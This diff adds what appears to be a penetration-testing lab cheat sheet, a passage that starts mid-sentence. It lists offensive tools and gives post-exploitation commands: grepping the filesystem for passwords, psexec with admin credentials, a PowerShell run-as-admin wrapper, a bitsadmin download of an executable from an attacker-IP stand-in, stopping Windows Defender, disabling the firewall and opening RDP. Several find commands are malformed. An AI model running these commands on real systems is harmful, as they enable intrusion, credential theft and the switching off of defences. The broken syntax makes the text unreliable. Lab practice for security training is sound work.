@@ -1,0 +1,123 @@
+exploit most of the machines below tools:
+
+--Nmap, Netcat for port scanning and testing vulnerabilities
+--Dirbuster, Gobuster, Nikto and Burpsuite for Web application scanning
+--Tcpdump, Wireshark for sniffing traffic
+--Python HTTP Servers to serve RFI php shells.
+--Mimikatz, pwdump, fgdump, pwdump and procmon for password dumping and pass the hash/golden ticket attacks
+--Cuda Hashcat for password cracking (Nvidia graphics card)
+--Iptables, proxychains and sshuttle for routing hops
+--Medusa, Hydra for Http login form bruteforcing
+--Grep, sed, awk, sort, uniq, find, findstr, cut for finding passwords and sensitive files during privilege escalation and post exploitation recon
+--Snmpenum, enum4linux, nullinux, smbmap for smb and snmp enumeration
+--Powershell scripts and bitsadmin(built-in windows tool) to download files (highly recommended if you are not using meterpreter shell)
+--Sendemail, Python Servers for social engineering (yes, you will have to perform SE on automated bot systems for client side attacks)
+--Accesscheck.exe from sysinternals and Ntrights.exe, Churrasco.exe to find access misconfigurations
+--Psexec for lateral movements and remote shells
+--Cadaver and davtest for windows asp based web server to test read/write access
+
+reverse shells of perl, python, bash, socat and awk from pentestmonkey for quick tcp reverse shells.
+
+Post Exploit Enumeration
+========================
+
+grep -rnw '/' -ie 'pass' --color=always
+grep -rnw '/' -ie 'password' --color=always
+grep -rnw '/' -ie 'DB_PASS' --color=always
+grep -rnw '/' -ie 'DB_PASSWORD' --color=always
+grep -rnw '/' -ie 'DB_USER' --color=always
+
+File Upload on linux systems via base64 encoding
+=================================================
+
+cat file2upload | base64
+
+--Once the file is converted to base64, 
+--you can just create a new file on the remote system and copy the base64 output of the above file into it. 
+--Next step would be to reverse the base64 to binary
+
+cat fileWithBase64Content | base64 -d > finalBinary
+
+--You can also use the smbserver.py from Impacket’s repo to host a temporary smb server 
+--and fetch files in windows from remote smb servers using the net use command.
+
+PSexec Shells of Remote Systems
+================================
+
+.\psexec64.exe \\192.168.x.x -u .\administrator -p admin@123 cmd.exe
+
+Powershell Sudo for Windows
+===========================
+--There maybe times when you know the creds to admin, but will have a low privileged shell. Unlike Linux, we cannot sudo on windows machines. So, I wrote a simple powershell script for that which can run a separate file as admin. You can run a batch file to add a new superuser or just execute a meterpreter binary as admin. 
+--The below command is to be run in a powershell window:
+
+$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
+$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
+$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
+Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'
+
+--If however you want to run the powershell from a cmd prompt, 
+--you can run store the above command in a xyz.ps1 file and run it in cmd as below:
+
+powershell -ExecutionPolicy Bypass -File xyz.ps1
+
+Download files in Windows with bitsadmin
+=========================================
+
+bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
+
+Disable firewall/defender and enable RDP for all
+================================================
+
+sc stop WinDefend
+netsh advfirewall show allprofiles
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+
+Find files with SUID permission
+================================
+
+find / -perm -4000 -type f 2>/dev/null
+
+Find files with open permissions
+=================================
+
+find / -perm -777 -type f 2>/dev/null
+
+Find files with SUID permission for current user
+==================================================
+
+find / perm /u=s -user `whoami` 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
+
+Find files with writable permission for current user or current group
+=====================================================================
+
+find / perm /u=w -user `whoami` 2>/dev/null
+find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
+find / -perm /u+w -user `whoami` 2>/dev/nul
+
+Find directories with writable permissions for current user or current group
+=============================================================================
+
+find / perm /u=w -type -d -user `whoami` 2>/dev/null
+find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
+
+So, I made myself a few commitments:
+
+Try avoiding Metasploit at all costs. Neither exploits nor meterpreter shells. 
+(However I had to use them at few places where I needed to use shellcode or needed to quickly migrate my shell from an unstable exploit/process)
+Only use msfvenom for building shellcode.
+Use netcat for reverse shells.
+
+
+
+
+
+
+
+
+
